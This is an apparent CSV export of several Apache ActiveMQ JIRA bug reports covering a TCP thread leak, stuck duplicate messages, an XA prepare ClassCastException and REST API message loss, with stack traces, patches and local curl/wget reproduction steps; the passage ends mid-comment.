Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocker),Outward issue link (Blocker),Inward issue link (Cloners),Inward issue link (Container),Outward issue link (Container),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Incorporates),Inward issue link (Incorporates),Outward issue link (Incorporates),Outward issue link (Problem/Incident),Inward issue link (Reference),Inward issue link (Reference),Inward issue link (Reference),Outward issue link (Reference),Outward issue link (Reference),Outward issue link (Reference),Inward issue link (Regression),Outward issue link (Regression),Inward issue link (Required),Inward issue link (Required),Outward issue link (Required),Inward issue link (Supercedes),Outward issue link (Supercedes),Inward issue link (dependent),Inward issue link (dependent),Outward issue link (dependent),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Affects version (Component)),Custom field (Attachment count),Custom field (Blog - New Blog Administrators),Custom field (Blog - New Blog PMC),Custom field (Blog - Write access),Custom field (Blog Administrator?),Custom field (Blogs - Admin for blog),Custom field (Blogs - Email Address),Custom field (Blogs - Existing Blog Access Level),Custom field (Blogs - Existing Blog Name),Custom field (Blogs - New Blog Write Access),Custom field (Blogs - Username),Custom field (Bug Category),Custom field (Bugzilla - Email Notification Address),Custom field (Bugzilla - List of usernames),Custom field (Bugzilla - PMC Name),Custom field (Bugzilla - Project Name),Custom field (Bugzilla Id),Custom field (Bugzilla Id),Custom field (Change Category),Custom field (Complexity),Custom field (Discovered By),Custom field (Docs Text),Custom field (Enable Automatic Patch Review),Custom field (Epic Link),Custom field (Estimated Complexity),Custom field (Evidence Of Open Source Adoption),Custom field (Evidence Of Registration),Custom field (Evidence Of Use On World Wide Web),Custom field (Existing GitBox Approval),Custom field (External issue ID),Custom field (External issue URL),Custom field (Fix version (Component)),Custom field (Git Notification Mailing List),Custom field (Git Repository Import Path),Custom field (Git Repository Name),Custom field (Git Repository Type),Custom field (GitHub Options),Custom field (Github Integration),Custom field (Github Integrations - Other),Custom field (Global Rank),Custom field (INFRA - Subversion Repository Path),Custom field (Initial Confluence Contributors),Custom field (Last public comment date),Custom field (Level of effort),Custom field (Machine Readable Info),Custom field (Mentor),Custom field (New-TLP-TLPName),Custom field (Original story points),Custom field (Parent Link),Custom field (Patch Info),Custom field (Priority),Custom field (Project),Custom field (Protected Branch),Custom field (Rank),Custom field (Rank (Obsolete)),Custom field (Regression),Custom field (Regression),Custom field (Review Date),Custom field (Reviewer),Custom field (Severity),Custom field (Severity),Custom field (Skill Level),Custom field (Source Control Link),Custom field (Space Description),Custom field (Space Key),Custom field (Space Name),Custom field (Start Date),Custom field (Tags),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Test and Documentation Plan),Custom field (Testcase included),Custom field (Tester),Custom field (Workaround),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
TCP Connections and related thread leak.,AMQ-4955,12686325,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,artnaseef,thodimi,thodimi,24/Dec/13 20:05,29/May/15 21:53,14/Jul/23 05:43,29/May/15 21:53,5.8.0,,,,,5.12.0,,,Broker,,,,3,,,,,,,,,"TCP Connections and related thread leak.

Scenario

Active MQ version 5.8
NMS Client version 1.6
OS - Windows 2008 R2
JDK - 1.7.x

activemq.xml is attached

If a client connectivity gets lost between the time the initial socket is created and the exchange of the wire format, the active MQ server's Client's server thread gets blocked in socket read hanging out the TCP connection and the related thread
Here are the steps to recreate
1. Configure the Active MQ server with the activemq.xml attached.
2. Start the client in a debugger and have a break point at a place in such a way that the client can be disconnected after the socket is established.
3. Once the breakpoint is hit, disconnect the client machine from the network
4. Kill the client- This basically simulates a situation where the socket tear down packets are not reached the active mq server.
5. Open the JConsole. Look for the hanging TCP connection and the related thread.
Is there an configurable option in Active MQ to sweep and close the connections, on regular interval, that still didn't finish the wire protocol negotiation?","Windows 2008 R2, Jdk 1.7.40",anujkhandelwal,artnaseef,deepakkumarpitti,rajdavies,tabish,thodimi,xbhanu,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5794,,,,,,,,,,,,,"03/Feb/14 00:57;thodimi;AMQ4955Test.java;https://issues.apache.org/jira/secure/attachment/12626579/AMQ4955Test.java","24/Dec/13 20:06;thodimi;TCP-Connection.jpg;https://issues.apache.org/jira/secure/attachment/12620383/TCP-Connection.jpg","24/Dec/13 20:06;thodimi;ThreadStack.jpg;https://issues.apache.org/jira/secure/attachment/12620384/ThreadStack.jpg","24/Dec/13 20:08;thodimi;activemq.xml;https://issues.apache.org/jira/secure/attachment/12620385/activemq.xml",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,365305,,,Fri May 29 21:53:49 UTC 2015,,,,,,,,,,,"0|i1qyrz:",365608,,,,,,,,,,,,,,,,,,,,,"24/Dec/13 20:12;thodimi;I have further did remote debugging on this. It points to the following area of the code.
InactivityMonitor.configuredOk()
This method is coded is such a way that it returns false if the wire protocol from the client has not been received. Because of this the connection is not yet added to be monitored by the inactivity monitor so the Client connections that did not finish the wire protocol negotiation are never can be cleaned up by the Broker leaking and eventually running out of threads and memory.
;;;","06/Jan/14 17:13;thodimi;1. When the server starts a transport connection, the first command it is dispatching is BrokerInfo command
Note: BrokerInfo command is not tagged as DispatchMessage ( isMessageDispatch() is false on Broker Command)	

2. WireFormatNegotiator::oneway  method throws a IOException with Wire format negotiation timeout
3. TransportConnection::processDispatch method ignores that IOException because the command that was sent out is not a MessageDispatch Command.
Result is Wire format negotiation timeout is thrown out without being handled resulting the ActiveMQ Transport thread leak

I have fixed this by added the following lines of code to the TransportConnection:processDispatch  's IOException handling block of code.
            if(command.isBrokerInfo())
                   throw e;;;;","08/Jan/14 17:03;tabish;Have you created a test case that reproduces this problem?  Have you tested against the latest code?;;;","09/Jan/14 09:44;anujkhandelwal;Hey,
I am facing the similar issue in which I can see lot of connections from the same client ( around 100). I think connections are not getting closed properly. 

Configuration:
1. All clients are using pooled connection factory where max Connection limit is specified as 3.
2. ActiveMQ version: 5.8

I suspect that default value of 'maxInactivityDuration' is less (30 sec) and broker might not able to send/read heartbeats  for all the connections in this given specified time. So I think by increasing the value of  'maxInactivityDuration' we could avoid this issue since broker will have enough time to handle heartbeat related stuff.

I think Tim might help us here.

Thanks,
Anuj;;;","10/Jan/14 06:52;artnaseef;Based on the description of the steps to reproduce, I tried a client program that doesn't use a connection factory, but instead just opens a socket to the server, then closes it.  This test failed to produce any sort of leak.  One difference - I'm testing 5.9.0.

Is there anything else that needs to happen in the normal connection sequence that my test might miss?

Can you try to reproduce the problem with 5.9.0?;;;","10/Jan/14 13:43;thodimi;Open the socket connection, and before closing the socket disconnect your client machine from the network, so that RST or the FIN packets never makes it to the server.
I am also planning to do the test on 5.9.

;;;","10/Jan/14 17:23;artnaseef;If it's necessary to prevent RST or FIN, then doesn't that point to either a tcp/ip timeout issue or a bug in the server's tcp/ip stack?

Please check netstat on the broker system when this happens.  If the socket is listed there, then this is not an ActiveMQ bug. 

Sent from my iPhone

;;;","16/Jan/14 15:15;rajdavies;Its not clear this is a broker problem - and not a application problem - downgrading to major;;;","03/Feb/14 00:57;thodimi;Unit test;;;","03/Feb/14 01:01;thodimi;Attached the unit test both for the TCP and SSL. Tested on 5.9 too with no success.
The fix I have proposed to TransportConnection:ProcessDispatch catch block to add these lines of code at the beginning fixes only TCP connector, but not the SSL connector

         boolean isBrokerInfo=command.isBrokerInfo();
         if(isBrokerInfo)
         	 throw e;
Please suggest any alternative ideas that fixes both for all the transports, I can try coding that.;;;","12/Mar/14 02:43;artnaseef;Looking at the comments in the unit test, it appears to be attempting to avoid problems caused by opening socket connections to the broker without the broker timing them out.  Is that correct?

Is that the focus of this issue now?
;;;","01/Apr/14 05:19;artnaseef;Throwing an exception on dispatching a BrokerInfo in TransportConnection sounds like a major problem since BrokerInfo's do need to cross transports.

What's the state of this issue?;;;","01/Apr/14 05:27;artnaseef;Reading back through the comments, I see the issue being raised now -- the eaten IOException for all commands except MessageDispatch.

I think the right thing to do here is to always re-throw the exception.  Can anyone think of a case in which an IOException on Broker.preProcessDispatch() or TransportConnection.dispatch() could have a non-fatal meaning?;;;","29/May/15 21:53;tabish;This scenario should be addressed by enhancements in AMQ-5794 broker will close incoming connections that have not completed their negotiation after the connection attempt timeout value has been reached.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When duplicate message occur from network producer, messages blocked by cursor audit are blocked till restart",AMQ-4952,12685909,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,20/Dec/13 22:15,09/Jun/14 11:40,14/Jul/23 05:43,08/Jan/14 12:52,5.9.0,,,,,5.10.0,5.9.1,,Message Store,,,,0,duplicate,network,stuck,,,,,,"If auditNetworkProducers is off (as it is by default) a reforward (because of a missing send reply) will be a duplicate.
If the initial messages is still in the store the duplicate will be trapped by the   message cursor but the message remains in the store. So on a restart the cursor is fresh (unless in the case of jdbc when there are still messages in the store) and the message gets redispatched. In the jdbc case - if the store/destination is empty there will be a resend b/c there is no sequence state to replay.
Duplicates detected by the cursor need to deal with the duplicate message - moving to the DLQ makes the most sense - the cause can indicate the reason  to allow separation from poison due to redelivery failure.

Client duplicate detection currently uses a poison ack, so this makes the behaviour consistent.",,gtully,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4924,AMQ-4465,,AMQ-5212,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,365018,,,Mon Jun 09 11:40:17 UTC 2014,,,,,,,,,,,"0|i1qx1j:",365327,,,,,,,,,,,,,,,,,,,,,"20/Dec/13 22:19;gtully;linking to https://issues.apache.org/jira/browse/AMQ-4465 for more context

need to deal with duplicates to prevent eventuall delivery from https://issues.apache.org/jira/browse/AMQ-4924;;;","08/Jan/14 12:52;gtully;when the cursor detects a duplicate the message is removed and referred for DLQ processing with a reasonCause of ""duplicate from store""
Thus it does not remain ""stuck"" till a restart. The typical use case where this can occur is with a duplicate forward from a network connector that fails  before getting a send reply happens after the original message has been dispatched. So the store does not trap the duplicate but the cursor does.

http://git-wip-us.apache.org/repos/asf/activemq/commit/f92d45be;;;","09/Jan/14 12:21;gtully;dealt with the audit false case and duplicate in pagedInMessages - now redirecting to DLQ and removing from the store in that case also
http://git-wip-us.apache.org/repos/asf/activemq/commit/cc47ab6d

JDBC store does not have a separate index to trap the duplicate that is still inflight. Also, cursor audit window may be too small for some use cases.
If there is a valid usecase where duplicates are acceptable we can revisit but all tests currently pass with the change that 'outlaws' and deals with duplicates.;;;","09/Jun/14 11:40;gtully;further refinement in further refinement in http://git-wip-us.apache.org/repos/asf/activemq/commit/27b3a7c3
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
""" java.lang.ClassCastException: org.apache.activemq.command.ExceptionResponse cannot be cast to org.apache.activemq.command.IntegerResponse, attempting to automatically reconnect""",AMQ-4950,12685803,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tmielke,tmielke,tmielke,20/Dec/13 12:45,02/Apr/14 22:14,14/Jul/23 05:43,06/Jan/14 13:25,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,1,prepare,transaction,XA,,,,,,"If an XA prepare() raises an exception back to the client it results in the warning 

{noformat}
WARN  FailoverTransport - Transport (tcp://127.0.0.1:61249) failed, reason:  java.io.IOException: 
Unexpected error occured: java.lang.ClassCastException: 
org.apache.activemq.command.ExceptionResponse cannot be cast to 
org.apache.activemq.command.IntegerResponse, attempting to automatically reconnect
{noformat}

which triggers a failover reconnect and a replay of the transaction which then causes

{noformat}
2013-12-20 13:38:12,581 [main] - WARN  TransactionContext - prepare of: 
XID:[86,globalId=00000001,branchId=00000001] failed with: javax.jms.JMSException: Cannot call prepare now.
{noformat}
",,maroos,tabish,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,365020,,,Mon Jan 06 13:25:41 UTC 2014,,,,,,,Patch Available,,,,"0|i1qx1z:",365329,,,,,,,,,,,,,,,,,,,,,"20/Dec/13 12:51;tmielke;Full error message:
{noformat}
2013-12-20 13:38:12,558 [0.1:61249@61251] - WARN  FailoverTransport              - Transport (tcp://127.0.0.1:61249) failed, reason:  java.io.IOException: Unexpected error occured: java.lang.ClassCastException: org.apache.activemq.command.ExceptionResponse cannot be cast to org.apache.activemq.command.IntegerResponse, attempting to automatically reconnect
...
2013-12-20 13:38:12,581 [main           ] - WARN  TransactionContext             - prepare of: XID:[86,globalId=00000001,branchId=00000001] failed with: javax.jms.JMSException: Cannot call prepare now.
javax.jms.JMSException: Cannot call prepare now.
        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1405)
        at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:757)
        at org.apache.activemq.TransactionContext.prepare(TransactionContext.java:453)
        at org.apache.activemq.bugs.AMQXXXTest.testXAPrepareFailure(AMQXXXTest.java:121)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at junit.framework.TestCase.runTest(TestCase.java:176)
        at junit.framework.TestCase.runBare(TestCase.java:141)
        at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107)
        at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113)
        at junit.framework.TestResult$1.protect(TestResult.java:122)
        at junit.framework.TestResult.runProtected(TestResult.java:142)
        at junit.framework.TestResult.run(TestResult.java:125)
        at junit.framework.TestCase.run(TestCase.java:129)
        at junit.framework.TestSuite.runTest(TestSuite.java:255)
        at junit.framework.TestSuite.run(TestSuite.java:250)
        at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
        at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53)
        at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123)
        at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164)
        at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110)
        at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175)
        at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81)
        at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
Caused by: javax.transaction.xa.XAException: Cannot call prepare now.
        at org.apache.activemq.transaction.XATransaction.illegalStateTransition(XATransaction.java:100)
        at org.apache.activemq.transaction.XATransaction.prepare(XATransaction.java:195)
        at org.apache.activemq.broker.TransactionBroker.prepareTransaction(TransactionBroker.java:248)
        at org.apache.activemq.bugs.AMQXXXTest$1.prepareTransaction(AMQXXXTest.java:81)
        at org.apache.activemq.broker.MutableBrokerFilter.prepareTransaction(MutableBrokerFilter.java:127)
        at org.apache.activemq.broker.TransportConnection.processPrepareTransaction(TransportConnection.java:408)
        at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:98)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:295)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:152)
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
        at java.lang.Thread.run(Thread.java:695)
{noformat};;;","20/Dec/13 16:05;tabish;Looks like the offending code is here in TransactionContext 

{code}
            // Find out if the server wants to commit or rollback.
            IntegerResponse response = (IntegerResponse)syncSendPacketWithInterruptionHandling(info);
            if (XAResource.XA_RDONLY == response.getResult()) {
                // transaction stops now, may be syncs that need a callback
	        	synchronized(ENDED_XA_TRANSACTION_CONTEXTS) {
	                List<TransactionContext> l = ENDED_XA_TRANSACTION_CONTEXTS.remove(x);
	                if (l != null && !l.isEmpty()) {
	                    if (LOG.isDebugEnabled()) {
	                        LOG.debug(""firing afterCommit callbacks on XA_RDONLY from prepare: "" + xid);
	                    }
	                    for (TransactionContext ctx : l) {
	                        ctx.afterCommit();
	                    }
	                }
	        	}
            }
{code}

We blindly cast to IntegerResponse before checking for error. ;;;","20/Dec/13 16:42;tabish;Possible patch, no test case at the moment to verify:

{code}
diff --git a/activemq-client/src/main/java/org/apache/activemq/TransactionContext.java b/activemq-client/src/main/java/org/apache/activemq/TransactionContext.java
index 7ff8702..64da65a 100755
--- a/activemq-client/src/main/java/org/apache/activemq/TransactionContext.java
+++ b/activemq-client/src/main/java/org/apache/activemq/TransactionContext.java
@@ -33,6 +33,7 @@
 import org.apache.activemq.command.ConnectionId;
 import org.apache.activemq.command.DataArrayResponse;
 import org.apache.activemq.command.DataStructure;
+import org.apache.activemq.command.ExceptionResponse;
 import org.apache.activemq.command.IntegerResponse;
 import org.apache.activemq.command.LocalTransactionId;
 import org.apache.activemq.command.Response;
@@ -754,7 +765,11 @@
      */
     private Response syncSendPacketWithInterruptionHandling(Command command) throws JMSException {
         try {
-            return this.connection.syncSendPacket(command);
+            Response result = this.connection.syncSendPacket(command);
+            if (result instanceof ExceptionResponse) {
+                throw JMSExceptionSupport.create(((ExceptionResponse) result).getException());
+            }
+            return result;
         } catch (JMSException e) {
             if (e.getLinkedException() instanceof InterruptedIOException) {
                 try {
{code};;;","06/Jan/14 13:25;tmielke;Fixed in commit [f69cbd8ec6ec7cfa78a83892d32c7bb3bbd3a7d1|https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=f69cbd8ec6ec7cfa78a83892d32c7bb3bbd3a7d1].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Queue Messages lost after read timeout on REST API.,AMQ-4938,12684816,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,psedi,psedi,15/Dec/13 16:00,02/Apr/14 22:06,14/Jul/23 05:43,16/Jan/14 15:20,5.10.0,5.8.0,5.9.0,,,5.10.0,5.9.1,,,,,,0,,,,,,,,,"I have been trying to send/receive messages via a Queue using the [REST API|http://activemq.apache.org/rest.html]. While testing I found that some messages got lost after a consuming request times out when no message is available.

Here is a transcript of the test case I used:

{code}
#
# OK: send first, consume later
#
$ curl -d ""body=message"" ""http://localhost:8161/api/message/TEST?type=queue""
Message sent

$ wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=1000""
message

#
# OK: start consuming, then send (within timeout)
#
$ wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000""&
[1] 5172

$ curl -d ""body=message"" ""http://localhost:8161/api/message/TEST?type=queue""
messageMessage sent[1]+  Fertig                  wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000""

#
# NOK: start consuming, wait for timeout, then send and consume again
#
$ wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000""

$ curl -d ""body=message"" ""http://localhost:8161/api/message/TEST?type=queue""
Message sent

$ wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000""
{code}

The last *wget* returns after the given read timeout without any message. When looking at the managament console, the message has been consumed.

I tested this with 5.8.0 on linux as well as with 5.8.0, 5.9.0 and a freshly built 5.10.0 on windows.","Win32, Linux",artnaseef,psedi,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jan/14 03:33;artnaseef;AMQ-4938.patch;https://issues.apache.org/jira/secure/attachment/12622526/AMQ-4938.patch","14/Jan/14 17:33;artnaseef;AMQ-4938B.patch;https://issues.apache.org/jira/secure/attachment/12622894/AMQ-4938B.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,363888,,,Fri Jan 17 03:51:17 UTC 2014,,,,,,,,,,,"0|i1qq2f:",364194,,,,,,,,,,,,,,,,,,,,,"17/Dec/13 22:38;psedi;After enabling DEBUG logging, I found the following output after 
* starting the server clean
* wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=1000""
* curl -d ""body=message"" ""http://localhost:8161/api/message/TEST?type=queue""

{code}
2013-12-17 23:28:52,121 | DEBUG | Async client internal exception occurred with no exception listener registered: java.lang.IllegalStateException: IDLE,initial | org.apache.activemq.ActiveMQConnection | ActiveMQ Session Task-1
java.lang.IllegalStateException: IDLE,initial
        at org.eclipse.jetty.server.AsyncContinuation.dispatch(AsyncContinuation.java:408)
        at org.eclipse.jetty.server.AsyncContinuation.resume(AsyncContinuation.java:815)
        at org.apache.activemq.web.MessageServlet$Listener.onMessageAvailable(MessageServlet.java:395)
        at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1383)
        at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)
        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:724)
2013-12-17 23:28:52,121 | DEBUG | Sent! to destination: queue://TEST message: ActiveMQTextMessage {commandId = 0, responseRequired = false, messageId = ID:turtle-52404-1387319318754-3:2:1:1:1, originalDestination = null, originalTransactionId = null, producerId = null, destination = queue://TEST, transactionId = null, expiration = 0, timestamp = 1387319332114, arrival = 0, brokerInTime = 0, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = true, type = null, priority = 5, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = null, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, readOnlyProperties = f
{code}

Looks to me that the consuming session from the first wget is still there, in IDLE state -- but still is able to consume the message. Hope this helps -- I can't do any further testing or even debugging without a deeper understanding of ActiveMQ's internal workings.;;;","17/Dec/13 22:46;psedi;Another thing: Setting the prefetch size to 1 as suggested in [Apache ActiveMQ ™ -- REST|http://activemq.apache.org/rest.html] didn't help. There's just one consumer here anyway, I guess.;;;","11/Jan/14 05:59;artnaseef;It also seems that sending multiple messages after the timed-out consumption, only the first of those messages is lost.

Here's debug output from the rest servlet (org.apache.activemq.web.MessageServlet).

*get with no messages on queue*
{noformat}
DEBUG | Getting local client [GETID]
DEBUG | Receiving message(s) from: queue://TEST with timeout: 1000
DEBUG | Received 0 message(s)
DEBUG | Getting local client [GETID]
DEBUG | Receiving message(s) from: queue://TEST with timeout: 1000
{noformat}

*send 3 messages, get 3 times*
{noformat}
DEBUG | Sending message to: queue://TEST with text: message
DEBUG | Sending message to: queue://TEST with text: message
DEBUG | Sending message to: queue://TEST with text: message
DEBUG | Getting local client [GETID]
DEBUG | Receiving message(s) from: queue://TEST with timeout: 1000
DEBUG | Received 1 message(s)
DEBUG | Getting local client [GETID]
DEBUG | Receiving message(s) from: queue://TEST with timeout: 1000
DEBUG | Received 1 message(s)
DEBUG | Getting local client [GETID]
DEBUG | Receiving message(s) from: queue://TEST with timeout: 1000
DEBUG | Received 0 message(s)
DEBUG | Getting local client [GETID]
DEBUG | Receiving message(s) from: queue://TEST with timeout: 1000
{noformat}

Note only 2 messages were received.;;;","11/Jan/14 06:08;artnaseef;Watching the stats using the web console, the stats update as follows:

|| stat || on normal send || on send after get timed out ||
| Dequeue Counter | no change | +1 |
| Message count waiting acknowledge | +1 | no change |
| Dispatched Counter | +1 | +1 |
| Enqueue Counter | +1 | +1 |

So, it appears the consumer is acknowledging the message immediately.
;;;","12/Jan/14 03:33;artnaseef;Attached is a patch that eliminates the erroneous consumption; the problem is that the continuation defined for the web request times out, but the availableMessageListener for the consumer is never updated with that fact.  So, when the next message comes in, the listener consumes it with the intent that the continuation of the web request will receive it.

I'm going to review this code more carefully for race conditions.  I'm convinced there are races on the use of MessageConsumer's if more than one web request comes in for the same consumer (e.g. using the same clientId).  There may be more, including in this patch.;;;","12/Jan/14 19:03;psedi;Thank you very much for the fix, I can confirm it works with the above test case. With just one client, no messages are lost.

Here's another test case involving two distinct client IDs, but no actual race:
{code}
#
# Two clients with IDs ""GETID-1"" and ""GETID-2""... both timeout since there are no messages yet
#
wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID-1&readTimeout=1000""
wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID-2&readTimeout=1000""

# Send a message:
curl -d ""body=$((++i))"" http://localhost:8161/api/message/TEST?type=queue; echo "": $i""
Message sent

#
# Receive using first client ID, OK
#
wget --no-http-keep-alive -q -O - ""http://localhost:8161/api/message/TEST?type=queue&clientId=GETID-1&readTimeout=1000""
1

#
# Send a message again:
#
curl -d ""body=$((++i))"" http://localhost:8161/api/message/TEST?type=queue; echo "": $i""
Message sent

#
# Receive using first client ID, no response, not OK
#
